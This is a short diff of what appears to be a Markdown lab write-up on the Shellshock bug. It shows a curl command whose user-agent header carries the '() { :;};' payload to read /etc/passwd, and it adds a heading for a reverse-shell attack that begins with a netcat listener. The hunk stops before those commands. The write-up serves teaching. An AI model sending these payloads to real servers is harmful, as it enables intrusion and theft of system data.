@@ -57,7 +57,10 @@ curl -A "() { :;}; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/
 
 In the command above, the expression *() { :;};* is a empty function which should be parsed into a envrionment variable. Instead of stopping the parsing process the addtional code is being executed, which accessses the **etc/passwd** file and prints it with the **/bin/cat** tool in our console.
 
-### Attack 2
+### Attack 2 Reverse Shell
+![Reverse-Shell](./images/reverseshell.jpg)
+Source: (https://blog.finxter.com/python-one-line-reverse-shell/)
+### Execution
 in the second attack a reverse shell is being created. 
 1. start netcat listener on the host computer:
 ```    
